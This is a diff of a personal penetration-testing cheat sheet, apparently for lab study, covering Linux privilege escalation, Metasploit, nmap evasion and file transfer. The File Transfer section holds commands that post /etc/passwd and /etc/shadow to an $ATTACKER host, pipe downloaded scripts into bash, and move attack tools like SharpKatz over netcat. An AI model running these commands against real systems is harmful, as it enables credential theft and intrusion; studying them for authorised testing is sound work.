@@ -1,38 +1,38 @@
 - [BASIC ENUM](#basic-enum)
 - [Existing Tools](#existing-tools)
-  - [Ping and Port Scanning](#ping-and-port-scanning)
+- [Ping and Port Scanning - Ping Sweep](#ping-and-port-scanning---ping-sweep)
 - [Shells](#shells)
-  - [PWNCAT-CS](#pwncat-cs)
-  - [Stabilizing](#stabilizing)
+- [PWNCAT-CS](#pwncat-cs)
+- [Stabilizing](#stabilizing)
 - [Privilege Escalation](#privilege-escalation)
   - [shared libraries](#shared-libraries)
   - [capabilities](#capabilities)
   - [Cronjobs](#cronjobs)
   - [PATH](#path)
-    - [PYTHON PATH HIJACKING](#python-path-hijacking)
-  - [NFS](#nfs)
+  - [PYTHON PATH HIJACKING](#python-path-hijacking)
   - [Executables](#executables)
-    - [Finding Important Files](#finding-important-files)
-- [Uploading Files](#uploading-files)
+  - [Finding Important Files](#finding-important-files)
+- [File Transfer](#file-transfer)
+  - [Other Ways](#other-ways)
+  - [Using code](#using-code)
+  - [Encrpytion](#encrpytion)
+  - [Using HTTPS](#using-https)
 - [Searchexploit](#searchexploit)
 - [Code Analyse](#code-analyse)
 - [METASPLOIT](#metasploit)
   - [msfvenom](#msfvenom)
-    - [Meterpreter](#meterpreter)
-    - [Metasploit with database](#metasploit-with-database)
+  - [Meterpreter](#meterpreter)
+  - [Metasploit with database](#metasploit-with-database)
 - [Port Scanning (NMAP - DB\_NMAP - Socat)](#port-scanning-nmap---db_nmap---socat)
   - [Firewal Evasion](#firewal-evasion)
-    - [Routes](#routes)
-    - [Fragmentation/MTU/Size](#fragmentationmtusize)
-  - [Port Forwarding](#port-forwarding)
+  - [Routes](#routes)
+  - [Fragmentation/MTU/Size](#fragmentationmtusize)
   - [Summary](#summary)
-  - [Sandbox Evasion](#sandbox-evasion)
-  - [Memory Dump (more learn)](#memory-dump-more-learn)
-  - [Recover files](#recover-files)
+- [Sandbox Evasion](#sandbox-evasion)
+- [Memory Dump (more learn)](#memory-dump-more-learn)
+- [Recover files](#recover-files)
 
-
-
-# BASIC ENUM
+## BASIC ENUM
 - User/groups
 - hostnames
 - routing tables
@@ -43,7 +43,7 @@
 - snmp, dns
 - credentials
 
-# Existing Tools
+## Existing Tools
 - ls /etc/*release = version, os
 - hostname
   
@@ -94,15 +94,16 @@
   - -pf: command + file system
   - -i 1000 = every ms
 
+## Ping and Port Scanning - Ping Sweep
+```
+# Hosts
+for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
 
+# Ports
+for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
+```
 
-## Ping and Port Scanning
--  hosts: for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
-   -  for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
--  
--  ports: for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
-
-# Shells
+## Shells
 - Reverse:
   - [Atacker] LISTENER <---------[Victim]
 - - Binding:
@@ -147,7 +148,7 @@
 -  ctr + z = back to our shel
 -  stty raw -echo; fg = back to reverse shell
 
-# Privilege Escalation
+## Privilege Escalation
 - https://tryhackme.com/room/introtoshells
 - https://tryhackme.com/room/linprivesc
 - Check list
@@ -175,7 +176,7 @@
 - sudo -l
 - [for SUID files](https://gtfobins.github.io/gtfobins/find/)
 
-## shared libraries 
+### shared libraries 
 - sudo -l ==> LD_PRELOAD ==>   
 - https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
 - ldd = shared object dependencies
@@ -209,8 +210,7 @@ LD_PRELOAD=root.so executable restart
 - compile malicious file and put in the folder
 - Execute target file
 
-
-## capabilities
+### capabilities
 - find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
 - binary can set perform specific actions
   - cap_sys_admin
@@ -223,14 +223,14 @@ LD_PRELOAD=root.so executable restart
 - getcap -r / 2>/dev/null
 - setcap CAP_NAME= /path/to/file
 
-## Cronjobs
+### Cronjobs
 - privilege of the owner
 - find script with root privilege
 - /etc/crontab
 - /etc/cron.d
 - check if file has no fullpath + create own script with reverse shell
 
-## PATH
+### PATH
 - Modify $PATH variable
 - Add file
 - echo $PATH
@@ -251,9 +251,7 @@ LD_PRELOAD=root.so executable restart
   - Has the lib write permission?
     - python3 -c 'import sys; print("\n".join(sys.path))'
 
-
-
-## Executables
+### Executables
 -SUID = Set User ID = Run with the privilege of the owner not of the user
 - Option 1
   - find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
@@ -270,21 +268,65 @@ LD_PRELOAD=root.so executable restart
   - cat ~/.*history | less
   - .ssh Folder is always a must
 
-# Uploading Files
-- Option 1 - starting local server
-  1. python3 -m http.server 8000
-  2. wget attacker-machine:8000/file.ext
-  3. curl attacker-machine:8000/file.ext
-  4. [Powershell] powershell **Invoke-WebRequest -Uri** http://10.9.1.255:80/shell.exe **-Outfile** file.exe
-  5. make executable: chmod +x file.ext
+## File Transfer
+- **Enconding**
+  - cat /path/to/file | base64 -w 0;echo ==> Encoding
+  - echo -n 'base64' | base64 -d > file  ==> Decoding
+    - uncompres file.Z
+- **wget | curl**
+  - wget http://$ATTACKER/file -O file
+  - curl http://$ATTACKER/file -o file
+    - | bash  ==> fileless
+    - | python3
+  
+- **HTTP local server**
+```
+# Attacker
+python3 -m http.server 8000
+python2.7 -m SimpleHTTPServer
+php -S 0.0.0.0:8080
+ruby -run -ehttpd . -p8000
 
+#Target
+curl attacker-machine:8000/file.ext
+chmod +x file.ext
+
+# Attacker: for file UPLOAD
+sudo python3 -m pip install --user uploadserver
+
+## Create self-signed certifiate
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+
+## Create folder + start server
+mkdir https
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+
+# Target
+curl -X POST https://$ATTACKER/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+wget $ATTACKER:8000/filetotransfer.txt
+```
+ 
+- **With bash**
+  -  --enable-net-redirections
+```
+# Connect to Attacker
+exec 3<>/dev/tcp/10.10.10.32/80
+
+# Get file
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+
+# Response
+cat <&3
+```
+
+- **SSH**
+  - scp user@$TARGET:/path/to/file .
+  - scp /path/to/file user@$TARGET:/copy/here
+    - -r = recursive
 - https: Create certificate + spawn https server
   - openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
   - python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
 
-- Option 2 - copy source
-  1. Copy code from source and past in the target + save .sh
-  2. make executable: chmod +x file.ext
    
 - option 3 - smbserver
   -  create server: sudo /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
@@ -292,14 +334,139 @@ LD_PRELOAD=root.so executable restart
   -  upload file: copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
   -  smbclient -U USER '//IP/folder'
 
-# Searchexploit
+### Other Ways
+- **NC**
+  - Transfering files
+      1. Start listener with nc with redirection
+      2. Send file using ncat
+```
+# Sending to TARGET
+## Target: receive the file
+nc -l -p 8080 > File.exe
+  ncat -l -recv-only = closes the connection once received
+
+## Attacker: send the file as input
+nc -q 0 $TARGET 8000 < file
+  -q 0 = closes the connection once sent
+  ncat -l --send-only
+
+# Sending to TARGET
+## Attacker
+sudo nc -l -p 443 -q 0 < SharpKatz.exe
+
+## Target
+nc 192.168.49.128 443 > SharpKatz.exe
+```
+
+- **PowerShell WinRM**
+  - Execute commands on remote computer: Member of group | Admin | Permissions
+```
+Test-NetConnection -ComputerName COMPUTERNAME -Port 5985
+$Session = New-PSSession -ComputerName COMPUTERNAME
+
+# LH=DB
+Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+
+# DB=LH
+Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+
+### Using code
+- Python oneliner:
+```
+# Download
+python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+
+
+# Upload
+## Attacker 
+python3 -m uploadserver
+
+## Target
+python3 -c 'import requests;requests.post("http://$ATTACKER:8000/upload",files={"files":open("/etc/passwd","rb")})'
+```
+
+- PHP
+```
+php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+
+php -r 'const BUFFER = 1024; $fremote = 
+fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+
+# Peping to create fileless
+php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+```
+- Ruby
+```
+ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+```
+
+- Perl
+```
+perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
+```
+
+- [JavaScript file upload](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068)
+```
+# wget.js
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+
+# Download file
+cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+```
+
+- VBScript
+```
+# VBS code
+im xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+
+# Download file
+cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
+```
+
+### Encrpytion
+- openssl
+
+```
+# Encrypt
+openssl enc -aes256 -iter 100000 -pbkdf2 -in /input/file -out file.enc
+-enc = encryt
+-inter = iterations
+-pbkdf2 = password-based key derivation function 
+
+# Decrypt
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in file.enc -out file
+```
+
+### Using HTTPS
+
+
+## Searchexploit
 - m = copie
 
-# Code Analyse
+## Code Analyse
 - snyk --scan-all-unmanaged
   - unpack zip file
 
-# METASPLOIT
+## METASPLOIT
 - msfconsole
 - use exploit/multi/handler
   - post/multi = post exploitation (generic)
@@ -318,7 +485,7 @@ LD_PRELOAD=root.so executable restart
 - Direct execution
   - msf -q -x "use exploit/path/to; set payload path/to/payload; set optionsName Name; exploit""
 
-## msfvenom
+### msfvenom
 - Many platforms and formats
 - Example generate hex of payload:
   - Method 1
@@ -345,7 +512,6 @@ LD_PRELOAD=root.so executable restart
   - msfvenom --list encoders / encrpyt
   - -e encoder_option
   - -i interation
-
 
 ### Meterpreter
 - sysinfo
@@ -374,7 +540,7 @@ LD_PRELOAD=root.so executable restart
 - workspace -d (delete)
 - workspace name (move to name)
 
-# Port Scanning (NMAP - DB_NMAP - Socat)
+## Port Scanning (NMAP - DB_NMAP - Socat)
 - db_nmap (for metasploit) | nmap
 - Scripts
   - --scrip *script_name*: most commom vulnerability scrips, CVEs will be shown
@@ -407,7 +573,7 @@ LD_PRELOAD=root.so executable restart
  - From services google for vulnerabilities /also search in metasploit
  - Common services: http, ftp, smb, ssh, rdp
 
-## Firewal Evasion
+### Firewal Evasion
 - Stateless: individual package
 - Statefull: stablished TCP session (all related packets)
 - NGFW: application layer
@@ -461,12 +627,7 @@ LD_PRELOAD=root.so executable restart
       - -b badsum
       - -S,-A,-P-U-F-R
 
-## Port Forwarding
-- nc -lvnp 443 -c "nc TARGET PORT"
-  - -c = --sh-exec
-  - -e = --exec
-
-## Summary
+### Summary
 |Approach     |NMAP Command                 |
 |-------------|-----------------------------|
 |Decoy        |-D IP,IP,ME, RND,RND,ME      |
@@ -514,7 +675,6 @@ LD_PRELOAD=root.so executable restart
   - imageinfo = find OP
     - python3 vol.py -f file.vmem  windows.info
     - many other pluggins
-
 
 ## Recover files
 - lsblk = show all disk
